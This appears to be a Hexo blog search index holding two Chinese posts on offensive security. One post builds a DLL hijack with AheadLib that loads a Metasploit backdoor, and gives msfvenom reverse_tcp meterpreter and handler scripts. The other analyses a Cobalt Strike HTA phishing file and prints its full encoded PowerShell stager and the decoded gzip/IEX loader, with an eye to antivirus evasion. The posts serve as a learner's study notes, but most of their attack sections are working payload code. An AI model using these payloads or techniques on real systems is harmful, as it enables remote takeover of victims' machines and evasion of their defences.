<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>dll劫持与AheadLib</title>
      <link href="2022/08/18/dll%E5%8A%AB%E6%8C%81%E4%B8%8EAheadLib/"/>
      <url>2022/08/18/dll%E5%8A%AB%E6%8C%81%E4%B8%8EAheadLib/</url>
      
        <content type="html"><![CDATA[<h1 id="dll劫持与AheadLib"><a href="#dll劫持与AheadLib" class="headerlink" title="dll劫持与AheadLib"></a>dll劫持与AheadLib</h1><p>最近在看msf配置信息的时候，看到生成dll文件，突然就想到了dll劫持，于是准备来折腾一下</p><h2 id="dll劫持"><a href="#dll劫持" class="headerlink" title="dll劫持"></a>dll劫持</h2><p>dll文件是计算机上的一类文件，提供给使用者一些开箱即用的变量、函数或类。库文件分为静态库和动态库，静态库和动态库的区别体现在程序的链接阶段：静态库在程序的链接阶段被复制到了程序中；动态库在链接阶段没有被复制到程序中，而是程序在运行时由系统动态加载到内存中供程序调用。使用动态库系统只需载入一次，不同的程序可以得到内存中相同的动态库的副本，因此节省了很多内存，而且使用动态库也便于模块化更新程序</p><p>dll劫持是当一个可执行文件运行时，Windows加载器将可执行模块映射到进程的地址空间中，加载器分析可执行模块的输入表，并设法找出任何需要的DLL，并将它们映射到进程的地址空间</p><blockquote><p>简单来说，dll的存在就是方便程序来直接调用，避免将相同的内容重复多遍，以此来节省内存<br>而dll劫持，由下面一个例子说明</p></blockquote><p>一个可执行文件运行时，需要调用<code>test.dll</code>文件，但此时我们可以生成一个恶意的<code>test.dll</code>文件，并让他调用我们由msf生成的<code>shell.dll</code>或者其他后门，再调用原来的<code>test.dll</code>文件</p><p><img src="https://s2.loli.net/2022/08/18/kgBDKU17lNzXWQa.png" alt="图解dll劫持"></p><p>如果dll劫持成功了，那原本的可执行文件仍将正常使用，但我们的后门也将成功执行，即msf上线</p><h2 id="AheadLib"><a href="#AheadLib" class="headerlink" title="AheadLib"></a>AheadLib</h2><p>这里推荐一个用来生成dll转发的工具<a href="https://github.com/Yonsm/AheadLib">AheadLib</a></p><p>我们随便找一个dll文件来测试一下</p><p><img src="https://s2.loli.net/2022/08/18/wp5fkSX9FNlmr2L.png"></p><p>我们把它生成的代码复制下来，用VisualStudio创建一个dll动态链接项目，但在这里，可能会出现比较多的问题<br>我这里使用的是ViusalStudio 2019 不同的版本可能会出现的问题不同</p><p>首先项目提示我没有引入头文件，于是我加上了<code>#include &quot;pch.h&quot;</code><br>紧接着出现了如下的报错</p><p><img src="https://s2.loli.net/2022/08/18/BAQiGUXbHg3z8wC.png"></p><p>解决方法是，在<code>项目-&gt;属性-&gt;高级-&gt;字符集</code> 改为使用多字节字符集</p><p><img src="https://s2.loli.net/2022/08/18/1JIjvcpbeUgOWFq.png"></p><p>其他版本的可能存在不同的报错，可以尝试如下方法</p><ol><li>将运行库改为多线程(/MT)<br><img src="https://s2.loli.net/2022/08/18/zank6NWHustC2cR.png"></li><li>将预编译头改为不使用<br><img src="https://s2.loli.net/2022/08/18/1ka4ZxJv6BO32WD.png"></li></ol><p>确认应用之后就只会有一个报错，我们不用管它，在Release x86的模式下，成功生成dll文件<br>成功处理好报错信息后，我们实现了由<code>test(evil).dll -&gt; test(org).dll</code><br>接下来实现<code>test(evil).dll-&gt;shell.dll</code><br>我们在AheadLib工具生成的cpp文件中，找到<code>DLLMain</code>函数，并加上我们需要调用的后门<code>shell.dll</code></p><p><img src="https://s2.loli.net/2022/08/18/Qrme8qxodRO3NGs.png"></p><p>成功编译后，将生成的dll文件改为与原dll相同的名字，即<code>test.dll</code>，将原本的test.dll改为<code>testorg.dll</code><br>这样我们就完成了dll劫持，当运行可执行文件时，将会先调用我们改写的<code>test.dll</code></p><p>最后，msf成功上线</p><p><img src="https://s2.loli.net/2022/08/18/ylZoMNxTp2Pfire.png"></p><hr><h2 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h2><p>最近浅浅的看了下sh文件的写法，于是就想到了写一些msf的sh文件，避免了每次使用msfconsole的复杂配置与msfvenum生成的复杂参数</p><blockquote><p>msfvenum的生成</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ip=192.168.31.208</span><br><span class="line">port=4444</span><br><span class="line">arch=x86</span><br><span class="line">platform=windows</span><br><span class="line">format=exe</span><br><span class="line">payload=windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="comment">#use exploit/muilt/handler</span></span><br><span class="line">out=../meter_re_tcp_x86.exe</span><br><span class="line"></span><br><span class="line">msfvenom -p <span class="variable">$payload</span> LHOST=<span class="variable">$ip</span> LPORT=<span class="variable">$port</span> -f <span class="variable">$format</span> -a <span class="variable">$arch</span> --platform <span class="variable">$platform</span> -o <span class="variable">$out</span></span><br></pre></td></tr></table></figure><blockquote><p>msfconsole的监听</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.31.208</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CS生成hta分析与powershell免杀</title>
      <link href="2022/08/16/CS%E7%94%9F%E6%88%90hta%E5%88%86%E6%9E%90%E4%B8%8Epowershell%E5%85%8D%E6%9D%80/"/>
      <url>2022/08/16/CS%E7%94%9F%E6%88%90hta%E5%88%86%E6%9E%90%E4%B8%8Epowershell%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="CS生成hta分析与powershell免杀"><a href="#CS生成hta分析与powershell免杀" class="headerlink" title="CS生成hta分析与powershell免杀"></a>CS生成hta分析与powershell免杀</h1><p>看着自己刚开始入门写的wp，才发现自己从来没正儿八经写过啥博客，最近遇到了一群朋友及其博客，于是准备记录一点有质量的内容</p><h2 id="hta文件分析"><a href="#hta文件分析" class="headerlink" title="hta文件分析"></a>hta文件分析</h2><p>hta文件是CS钓鱼经常会用到的一种攻击手法，但我从未考虑过里面的内容，今天突发奇想，想来看看里面到底写了些什么东西，并且杀毒软件是对于哪一部分进行了扫描并且报毒</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;VBScript&quot;</span>&gt;</span><br><span class="line"><span class="keyword">Function</span> var_func()</span><br><span class="line"><span class="keyword">Dim</span> var_shell</span><br><span class="line"><span class="keyword">Set</span> var_shell = <span class="built_in">CreateObject</span>(<span class="string">&quot;Wscript.Shell&quot;</span>)</span><br><span class="line">var_shell.run <span class="string">&quot;powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEALwA3AFYAWABhADIALwBpAFMAaABMADkASABIADYARgBQADAAUQBDAGEAdwBpAFgAWQBNAGgAagBWAHAASABHAGcAQQAwAEcANwBBAEQAbQB6AFUAVgBSAHUANwBzAHgASgBuADUAaAB0AHoASABtAHoAdgB6ADMATABSAHYASQB6AGUAdwBrAHUAeQBQAHQATABwAEoARgB1ADcAdQBxAHUAdQByAFUANgBlAHEAeQBUAHQAbQBOAHoAZwBJAEwATQA5AFUAagBsAEwAdQBaADAAQwBDADAAUABKAGUAcgA1AEgATABYAFQAVQA5AGgAMwBCAFAAMwBMAFoAOQBiAFIAeQA1AG0ANgBYAFEANgBlAEQARQBwAGUALwBFAEQARAA3ADgAZwBRAGcASQBhAGgAdAB4AGYAdQBhAHMAKwBDAHAARABEAEYAYQA3ADMASwBIAGgAeABQAEIATABaAHQATQBoAGwATAA2AGsAZwBKAFYARgBBACsAYQB1AHIAMwBGAFUAMgBGAGIAawBoAFcAdABNAFgARgB6AEYAcgBUADEAOABjAHkAagBZAGUAQwBXAEcAagB3AGwATAAwAC8AYQBiAG4ASQBNAHQAZABmAGYAMwBhAGkASQBLAEEAdQB1AHoAMABYAG0AcABSAEoAbwBZAGgAZABRAHoAYgBvAG0ARwBCADUANwA1AHoAMAB3ADAATgA2AE0AMgB6AHMAYQBXAFkAYwBYADkAeAAxAHkAKwBsAGwAdQAwAFoAeQBEADYATABKAFEAMgBFAE4AeABDAFEANgBKAEoAMAByAGUAZABoAGwARQBaAFEAMABuADMAYgBZAG8AWAA4AG4AMwAvAG0AKwBlAFgATgA3AGEAbwBrADcAUwBKAGsAaAA0AFcAOABuAG8AUwBNAE8AaQBWAGkAMgAzAG0AZQArADgARwBuAEcANAA0AFMAbgB4AGIAeQBxAG8AVQBEAEwALwBUAFcAcgBEAFMAMQBYAEsARgBTAEcAbQBmAGUAYQA1AG4AegA2AHMAbgAzAFAASAArAE8AegBQAFEAUgB4AFAARgA1AGsASwBuAFYAawAwADQAaABEADgATQArAFkAQwBPAGUATQBNAHcAWAB1AFcAVwA2ADMAMwBLADEANAByADYAOQBlAFQATwBNAFgARwBZADUAdABLAFMANABqAEEAYQBlAHIAOQBOAGcAYgAyAEUAYQBsAHQAcgBJAEoAVABZAGQAMABqAFcAbwA1AFUATgBJAG4AMgB2AG0AZQBYAEEAaQBvAEMAdwBLAFgATwA3AGkAQwArAGoAdAB2AFYAZABhAHUASABZAGoAMgB5ADYAQwAzAGUAWAB2ADIAbAAwAFYATgBCAHAAZgB3AFAAMQBkAHAAYwBKADcASgBaAEQAcQBzADQAQQB2AG4AagBuAHgATwAzAEMAbwBHAFcAOQBPADUAaQBDAGMAWAA3AHgALwBSAHkANABlAGYAcgA4AFEAagBNAC8AOQB5AEgAMQBBAFYAVQBKAHQAYQBpAEoARwBYAHgAagBnACsANAA2AHIAdQBhAHUAcgBaAFQAYQBrAEUARQArAGgANwA0AFYAVwBwAHYAZgBFAGwAWQB1AGMAQwBrADQAZwA1AGcAVgBKAG0AcwA1AFIARQBGAEYAKwA5AFgAZAArAFQAdAB0AGUATgBNAFAAaQBwADQAWgB1AEwAMQBwAG4AbgBWAE4ANgBUAG4ANAA4AGMAYwB1AEoAWgA1AEYAVgA3AG8AcgBQAG4AZABtAFQAegByADgAWQBrAFcAVQBUAEcAcQBUAHIAbgA1ACsARwBKAGwAMQBiAEwAbQAwAG0ATABuAEkAcwBmAEMARgA4ADQAYQBPAGMAMABiAFYATgBNAHoAeABLAEYAegBFAE4ALwBDAHoAawB6AHcAdQBVAE4ATQAvAG8ANQBGAE4AQQBsADcAKwBxAFMAWQA3AEYAMwBuAFQAcgBKACsAZABFAEQASABrAFAAdwBTAHUAZwBCAFAAKwB6AE0ANgBjAGMARgB2AEsASwBxADEASQBIADgARAB1ADkAQQAwADIAdgAxADMARABNADYARQBYADYAZgBMAFMAUwB5ACsANwBwAGUAOAByAGwAaABvADMAQwBzAE0AagAxAEkAegBqAG4AdQBNAGoAcABGAE4AbQBVAEYARABuAFIARABhADMAegBrAGgAZwB4AEwAeAB2AG0ALwAzAFoAWABqAFcAeABtAFkAUgBTAHkAaQA3AGsAVgAvAHcARwBrADUANgAwAGIAbgBnAHMAbgBKAHMASwBRAFgAWQBCAGgAcABQAHMAVQBXADgAaABPAFUAUwBsAHkAYgBZAHYAUQBlAHEASgBiADUAcwBXAEYALwBJAGUAWQBOAEoAQgB0AHcANQBFAEQAUwAzAHYASQBDAGMAeQBrAFcATwBnAHMANQBVAHgAQQBpAHYALwBLAEQANwA2AGsAVQA2AFkANAB2AGsAMABkAGsATQA2AHEAawBHAHcAagBFADIAcgBPACsAVQBSAGwAZABFAE0AbQBKAGYAbAAvADQALwBiAGwAbgBKAHcATwBSAFkAcgBWAEIAYQBSADMAVABnAE0AQgBkAE4AdABqAFIAVwA1AGkAQgBRAHoAcQBXAHIANwA0AEMALwBIACsATwAvAGQAKwBMAGoARQAvAHUAZABrAEkANgBEAG0AUgBoAGUAdwBnAEwAdQBzAEoAUwA0ADkATABKAG8AbgBUAHkAKwBYAHAARABjAHMATQB1AFkAQQBCAGEAbgBMAGcATwBYAFUAVQAwAHIAdQBxAG4AcABXAHgAUQBsADUANABpAEgAWgBLAG8AbQA0AEgAZAAwAEYATAAyAHMAdgB0AFgAVgBzAGEAdwBiAE8ASABSADkAagBKAFUAcQAvAFgARwBmAHIAMQBZAFEAOQBMADAAWABPAC8AWABlADYAcwBsAGMARgBEAHMAeAByAEYAawBSAEsATgA2AG0AVgBCAEwAbwBQAGMAYwBkAGUAUwAxAHMAcgArADIAWgB2AGYAUgBrADcAMQBsAHYAagBLAFgAbwBPADUAOABIADcAWABEAHAAdgBLAHYAaQBtADIASwB6AHQAUAB2AGoATwB0AHgANwBPAGQAawAvADcAQQBpAEcAKwBOAG0AUwBMAGYARwB5ADIANQAyAHAANgBFAGMAaQByAGYAVgB2AFoAMQBlAGQAZAA0ADkARwBEADgAaAA3AEoAdgBlAEIAMwBRAGUANwBqAHoAMwBYAHAATQBxAGwAVABxADMATgBGAFoARAA4AGMAQwBlADYARABJAFAAQwBUAGQAeQBSAGUAOQBmAE4AdQBhAEoARgBwAHYASQB2AG0AYQA3AHAASwBlAGMAVAB1AFEATwA5AHEAeABJAHIARgBEAG0AYgBTAEgAWgBTAEsARgBDAHoATABaAFMAVQBMAGYANgBQAG8AUQBwAHkASwBZACsAcAAzAGIAUwBYAFMAOQBuAHUAQgBYAE4AdABwAGEANgBoAGEAMwB0AFIANwBwADcAaAA1AHEANQBGAGgASgBaAEsAMABLAE8AQgB6ADAAUgBOADMATQA3ADgAZwBCAHoAKwBRAFkAegA3AFIAZQAwAHAANQByAEwAYgBDADcAaQA2AFoAbQB0AGEAMwBxAEEAdABqAFcAeQBTAEUAbQA0AC8AQwA1AE0AMgBKAHoAbwBZACsAYwBhAHAASwA0ADEAWQBhAHkAVgBRADQAOQA3AEwAUABKAHIASABNAFgAbwBLAFQAaAA5AHkAeABxADEATgBjAHMAMQBlADMAMABGAG0AYgBuAFUAVwBJAG4ALwAzAFIAOQBtAEIAQwB3AGIAYgBkAEgAegBTADcAWQBkAGgAdQBxAEMAcgBsAEEATgBaAG0ATwBRAGEAWQBiAFcAbQBEAHIASQBkAGcAcAA0AEcATgB5AHQAOABXAEMARgBxAHYARwBzAEsATwBOAEcAdQByAFUARQBEAHYASAB1AHEATgBaAFcARABCAG4AYQAwAEcAcgAwAGMATgA4ADEAaABDADAAeAA4AFoAbQBhAE0ANQBGAGIAegB3AHoAaQBZAE8AYwB1AG8AVQBIAHQAWgBoAFUATwBtAHgAUgA2AFIAdwBXAGMAYwAwAHkAWgBtAFIASABwAHYANgBCAHUATwBJAHoAcQBTAHgAaQBFAHQAZABzADUARAB3ADYAbwBrAG0AQwBSAGkAdgBzAEsASQBkAEYASwBMAHAAcQBTAHgARQBXAGcANgBFAHQAUABjADkAZgBoADYAMwBSAEIAQwAvAEUAUwBrADIAZABqAHYAMwArAHEASwB5AG8AYwBsAHcAZQBpAFQARQBUAFIAMQBKAHQATgBMAEIASgBkAHoAQgArAGIATABWAEUATABjAEkAdAAzAHgARQBQAG8AUwBZAGQAegBDAGEAQgBmAEEAegBMAGgALwBGAFkAMQBCAGkASgAxAFcAbAB6AHEATQB4AEYAZwBRAHoAMQBWADUATABhAHkAMgB5ADAAUgBGAFUAegBwAGcAdABCAHIATgBUADMAZQBLAEEATwBtADAATgBWAGsAegBmAHEAVwBCAG8ATwB1AGoAMwByAGQAUwBzADcAYwBRAFAASABpACsAMwBjADEAYQBxAHkAOABIAGkAawBzADMAQQBxAHgAKwB5ADQASABuAGoAagBlAFUAdgBzAHkAcwBDAGIAaABlAE8AYgBjADEAZAA2AHgAbQAxAGkARwBWAE4AaQA0AFMAbAArAG4AagB1ADMAQQBuAEkAbgBPAHoAeABiAHgARQAyAFgATwBMAGkATgBuAHgAZABUAGYANwA4AHcAbABUAGEASwBOADAARgBEAC8ALwAvAGoATgA2ADkAMABqAHIAUgBPAC8AcwBDAEMAZgBTADkAdgBjAEEAOABMADUAYQA3AGMAcQBwAHQAZwBuADkAWQByAGkAOQAyADgAMQBUAGsAMAAzAGIAbwBBAHYAcgBwAHoAVgAzAGEAYgBUAG8AZQBSAGkAbgArAEwAWABMAG0AQwB4AFoAcQB3AGcATABXAG0ATQA5AGsAWgBsAFgAbQBqAFgAZwBrAFYARgBBAE0AZQBsAHQAWQByADEAMQBDAGQAQQBFAC8AMQBxAGQAWgBUAGoAcwBEAG4AYwByAGgAVgBLAHUAcQBXAFMATwB4ACsASQB6AFIAYgB3AE0AUABZAEEAYgA0AEEAagA2AHcAdgBiAGkAZgBlAGgAYwBEAFQAUgBHADAAcQBpAFoAWgB5ADkAYwBCAFEAVQBNACsANABlAHIAdQAyAGQANAAyAEIAVgBlADAAYQAyADAAbQA0AHUASwArAHEAVQBWAGQAZwBSAHkAeAB0AFYAQgAxAHkATgBaAEEARwA1AFMASABrAFEAWgBPAEcAMABqAGkAdABEAC8AQQA4AHAAUgBWAHAANwBRAFgAUQBZAHgAegBTAGUALwBzAGYASABQAHoAZgAyAEkAeAA3AHEAegBsAFEAYQBhAEMASQBwAGYATgBmAHYAdgBEAHAAMwBmACsAMgBzAHIAdwArAHIAQwA2ADkAMgB0AHYANwBqAFgARQBBAGEAMABJAHQAcgBWAC8AWgB5AGgANgA5AHEAMQBxAGYATgBVAEEAcQBDAHMASQBOAHMAcQBHAGEAUQBSAE4AegB1AFkASgBrAEwANQBEAFAAcgBVAGoAZgBzADEASwBOAFEAdQBIAGoANwB2AG0AVgBCAGkANgAxAG8AYgBPAEUAMwB2AE4AUwB1AEUAWABiADkAbgBEAGEAUABIADMAUwB4AFUAQQByAGQAMgBxAHcAVgBuAEIAQgBqAFcARQBvAFYARAA0AGMAOABkAHkAYgBJAEgAUgBNAHAANQBpAE0AYQBMADMATwBHAG8AeAB6AGgASgBjACsANgB5AEwANAA5AGUAcwBDAHcAaQB1ACsAQQA3AEYASABYAFoATgB0AGkAbAB6ADUASQBKAFQATAA1AGYAUwAvAFcAdQBaAHoAdgB3ADkATAB3AC8ATwBUAHcAcAB1ADUAWQB0AHAAZwB2AGYAUABrAC8AVQA1ADIAdABoAE4ALwBSAGoAKwBJAFgASQBmACsARAB4AFAAdwAwADYAYgAvAEcAZABvAFUAdgBLAHgASABlADQATQB1AGMAKwBoAGoAdgBQAGgAYwAvAGwAcwB1AHAANgB5ADUAZAAvAE8AaABkAFkAUQB2AEUATAByAGoASABqAEwAdQBoAFUAQgAxAGQAcgBQADEARABQAGgAYwB5AGUANwBmAHcAagBYAGkATwBVAFcAYQBjAGQAZQBJACsAOABIAGQAUQBIAGgAaQBLAEYAVABnAG0AeQBVAHcAbwAvAFEAeQA1AGsANgBmAFkATgArADUARwBGAGsAbgB4AGUALwBjAGsARwBJAEsATABmAFIATgB4AHoATwBBAHAAUgBSADYAcQB0AFIAMABaAGkAUQBWAGgAcgBsAC8AQQB1ADcARABCAGoAUABUAEQAUQBBAEEAIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=&quot;</span>, <span class="number">0</span>, <span class="literal">true</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line">var_func</span><br><span class="line">self.close</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先来看hta的源码，使用VBS写的，是一种微软环境下的轻量级的解释型语言，同时它又是asp动态网页默认的编程语言，但这个不是重点，其中最令我们关注的是写入shell命令中的这一长短base64编码的东西，我们先解码看看是什么</p><p><img src="https://s2.loli.net/2022/08/16/4PVe1bmfKvyXRoF.png" alt="base64解码"></p><p>解码完了之后是这一段，把<code>.</code>替换掉，得到这一段代码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span>=<span class="built_in">New-Object</span> IOMemoryStream(,[<span class="type">Convert</span>]::FromBase64String(<span class="string">&quot;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&quot;</span>));<span class="built_in">IEX</span> (<span class="built_in">New-Object</span> IOStreamReader(<span class="built_in">New-Object</span> IOCompressionGzipStream(<span class="variable">$s</span>,[<span class="type">IOCompressionCompressionMode</span>]::Decompress)))ReadToEnd();</span><br></pre></td></tr></table></figure><p>我们还是先把中间的一长串拿去base64解密，但结果是一堆乱码，可惜<br>那我们来看看其他的<br>其中有这几个函数比较值得关注</p><blockquote><p><code>IOMemoryStream(,[Convert]::FromBase64String())</code>将字符串base64编码后，存入到流中<br><code>IOCompressionGzipStream()</code>使用Gzip压缩<br>最后通过Invoke-Expression（运行一个以字符串形式提供的 Windows PowerShell 表达式）将字符串当作命令执行</p></blockquote><p>网上有现成的脚本，我们直接拿去跑试一下<a href="http://chernodv.blogspot.com.cy/2014/12/powershell-compression-decompression.html">脚本原文链接</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = [<span class="type">System.Convert</span>]::FromBase64String(<span class="string">&#x27;H4sIAAAAAAAAALVXa2/iyBL9HH6FP0QCawhLMOQxq0hjGxsM2AFMeC6Kmu7GmPiF3cY4O/Pft2wgm9nJ7B3p3otk0e6uqq46dbq6bFJ2ZbLQxkz3CeWuxjSMbN/jaoXCZdPXGPfAfSkW1rGHWTadDZ4typ6D0MfPiJCQRhH3Z+Gij0LkcqXLPQqfXZ/EDi1z+UsmSEkcUv7ionCRT8VehNb02UPM3tNnl7KNTyLYqLQQg6Dpu8j2lp8/y3EYUo8d3ystysQoou7KsWlU4rmv3GRDQ3r1uNpSzLg/ucvnSsvxV8g5iaUywhsISPRIttbzMcoiqJiBY7NS8Y8/ivzi6npZUXYxcqJS0UwjRt0KcZwiz33jsw1HaUBLRd3GoR/5a1aZ2J5Qqzzl3hu58/rR9yJ/iswKEMTx8yAzq0edUhGGfcBGPGJYLHOLbL/Fcsl9efNmGHvMdmlF8xgN/cCk4d7GNKq0kUccOqRrUCtGkD7PKvLgREhZHHrc2RfQ2/svtHTpxY5TBruLX7W7LBk0OYP7q0ql90og1WchXz5x4lfg0HPeHM1BOD94/45cPPx+IBhf+Fb4gKqEOtRCjD4zwPcdVwsXF4t8SCGeUt+P7FzvgauWOR2cQMwP0yydozCm/PLv/By3PWtG5Z8auj5rnXSO6Tn68cAtxr5NloULvnBiTzb/vIpth9AwW//5aWjSte3RZuoh18Znwpc+yhldOzTHo3IWM8DPUvG0QEnzhE4xA3Txo5ri2uxNVzo6J2LIewReASX475055rBU1DyduoDf8R1oermGY0bP0qejlZ53z94zLssOiqIy14/hnOMyZ1LkUFLmRC+yT0tizPx8WPzbXT12mI1RxM7mlvwHkJ62ln0PTkyMIbsAw8gMKLaRk6FS5to2oVJq2tbZheKHmMjIceDIgaU95ARmMixMlnEmJOV/8oOvmJRpbuBQF6TzKqQ6yIKaczpROd2QRUnxX9w+n5PjociwOoP0zmkggOn4rMyN7ZBBXSuWfyDef+fe9yXmOzflkJ4SWcoP4kJKWXZcckmcXS4Pb1jmyIUMUFND35VQRG/qZl7GSkXhLt5pqb4d3IQtZa+2d21lBM8eHmGnKr1eZxhIwx5W4sd+u9pZa4O7Zj1OYi0eSVVBrYLc666lrLX9oz+7jt36NQm0vQFz0e2uHTW1fVNs13a+emPZ9yc7R/3BKrleTTX1dtVS6+1xpGbybW0vqTv53ofxb9pe9jugd3cTeFJC6lTp3NBpDycCu6PIOqTd8Sezet0ap0ZvrASG6ZHe6nqgdozXmsIOVdIeVokSzcl4pwj9VTeAODXBMm+8TmqaUopfYrEv61vcNnqku7trkNdaq